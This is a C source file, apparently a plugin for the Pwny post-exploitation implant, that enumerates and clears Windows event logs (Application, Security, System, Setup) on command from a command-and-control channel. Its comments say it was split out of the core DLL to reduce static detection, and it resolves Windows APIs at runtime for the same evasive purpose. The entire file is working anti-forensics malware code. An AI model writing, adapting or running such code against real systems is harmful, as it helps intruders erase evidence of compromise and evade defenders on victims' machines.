/*
 * MIT License
 *
 * Copyright (c) 2020-2026 EntySec
 *
 * Permission is hereby granted, free of charge, to any person obtaining a copy
 * of this software and associated documentation files (the "Software"), to deal
 * in the Software without restriction, including without limitation the rights
 * to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
 * copies of the Software, and to permit persons to whom the Software is
 * furnished to do so, subject to the following conditions:
 *
 * The above copyright notice and this permission notice shall be included in all
 * copies or substantial portions of the Software.
 *
 * THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
 * IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
 * FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
 * AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
 * LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
 * OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
 * SOFTWARE.
 */

/*
 * Event log tab plugin — enumerate and clear Windows event logs.
 *
 * Moved out of the core DLL to reduce the static detection
 * surface. Loaded on demand as a tab DLL via pe_load().
 */

#ifdef __windows__

#include <pwny/api.h>
#include <pwny/tlv_types.h>
#include <pwny/c2.h>
#include <pwny/log.h>

#include <windows.h>

#define COT_PLUGIN
#include <pwny/tab_cot.h>

/* Win32 function pointer typedefs */
typedef HANDLE (WINAPI *fn_OpenEventLogA)(LPCSTR, LPCSTR);
typedef BOOL   (WINAPI *fn_GetNumberOfEventLogRecords)(HANDLE, PDWORD);
typedef BOOL   (WINAPI *fn_CloseEventLog)(HANDLE);
typedef BOOL   (WINAPI *fn_ClearEventLogA)(HANDLE, LPCSTR);
typedef DWORD  (WINAPI *fn_GetLastError)(void);

static struct {
    fn_OpenEventLogA              pOpenEventLogA;
    fn_GetNumberOfEventLogRecords pGetNumberOfEventLogRecords;
    fn_CloseEventLog              pCloseEventLog;
    fn_ClearEventLogA             pClearEventLogA;
    fn_GetLastError               pGetLastError;
} w;


#define EVENTLOG_CLEAR \
        TLV_TAG_CUSTOM(API_CALL_STATIC, \
                       TAB_BASE, \
                       API_CALL)

#define EVENTLOG_LIST \
        TLV_TAG_CUSTOM(API_CALL_STATIC, \
                       TAB_BASE, \
                       API_CALL + 1)

#define TLV_TYPE_EVTLOG_NAME  TLV_TYPE_CUSTOM(TLV_TYPE_STRING, TAB_BASE, API_TYPE)
#define TLV_TYPE_EVTLOG_COUNT TLV_TYPE_CUSTOM(TLV_TYPE_INT, TAB_BASE, API_TYPE)

/* Standard Windows event log names */
static const char *default_event_logs[] = {
    "Application",
    "Security",
    "System",
    "Setup",
    NULL
};

static tlv_pkt_t *eventlog_list(c2_t *c2)
{
    tlv_pkt_t *result;
    int i;

    result = api_craft_tlv_pkt(API_CALL_SUCCESS, c2->request);

    for (i = 0; default_event_logs[i] != NULL; i++)
    {
        HANDLE hEventLog;
        DWORD count = 0;

        hEventLog = w.pOpenEventLogA(NULL, default_event_logs[i]);
        if (hEventLog != NULL)
        {
            w.pGetNumberOfEventLogRecords(hEventLog, &count);
            w.pCloseEventLog(hEventLog);
        }

        tlv_pkt_add_string(result, TLV_TYPE_EVTLOG_NAME,
                           (char *)default_event_logs[i]);
        tlv_pkt_add_u32(result, TLV_TYPE_EVTLOG_COUNT, (int32_t)count);
    }

    return result;
}

static tlv_pkt_t *eventlog_clear(c2_t *c2)
{
    char name[256];
    HANDLE hEventLog;

    if (tlv_pkt_get_string(c2->request, TLV_TYPE_EVTLOG_NAME, name) < 0)
    {
        /* No specific log name - clear all default logs */
        int i;
        int any_failed = 0;

        for (i = 0; default_event_logs[i] != NULL; i++)
        {
            hEventLog = w.pOpenEventLogA(NULL, default_event_logs[i]);
            if (hEventLog != NULL)
            {
                if (!w.pClearEventLogA(hEventLog, NULL))
                {
                    log_debug("* eventlog_clear: ClearEventLog(%s) failed (%lu)\n",
                              default_event_logs[i], w.pGetLastError());
                    any_failed = 1;
                }

                w.pCloseEventLog(hEventLog);
            }
            else
            {
                any_failed = 1;
            }
        }

        return api_craft_tlv_pkt(
            any_failed ? API_CALL_FAIL : API_CALL_SUCCESS,
            c2->request);
    }

    hEventLog = w.pOpenEventLogA(NULL, name);
    if (hEventLog == NULL)
    {
        log_debug("* eventlog_clear: OpenEventLog(%s) failed (%lu)\n",
                  name, w.pGetLastError());
        return api_craft_tlv_pkt(API_CALL_FAIL, c2->request);
    }

    if (!w.pClearEventLogA(hEventLog, NULL))
    {
        log_debug("* eventlog_clear: ClearEventLog(%s) failed (%lu)\n",
                  name, w.pGetLastError());
        w.pCloseEventLog(hEventLog);
        return api_craft_tlv_pkt(API_CALL_FAIL, c2->request);
    }

    w.pCloseEventLog(hEventLog);
    return api_craft_tlv_pkt(API_CALL_SUCCESS, c2->request);
}

COT_ENTRY
{
    w.pOpenEventLogA = (fn_OpenEventLogA)cot_resolve("advapi32.dll", "OpenEventLogA");
    w.pGetNumberOfEventLogRecords = (fn_GetNumberOfEventLogRecords)cot_resolve("advapi32.dll", "GetNumberOfEventLogRecords");
    w.pCloseEventLog = (fn_CloseEventLog)cot_resolve("advapi32.dll", "CloseEventLog");
    w.pClearEventLogA = (fn_ClearEventLogA)cot_resolve("advapi32.dll", "ClearEventLogA");
    w.pGetLastError = (fn_GetLastError)cot_resolve("kernel32.dll", "GetLastError");

    api_call_register(api_calls, EVENTLOG_CLEAR, (api_t)eventlog_clear);
    api_call_register(api_calls, EVENTLOG_LIST, (api_t)eventlog_list);
}

#endif
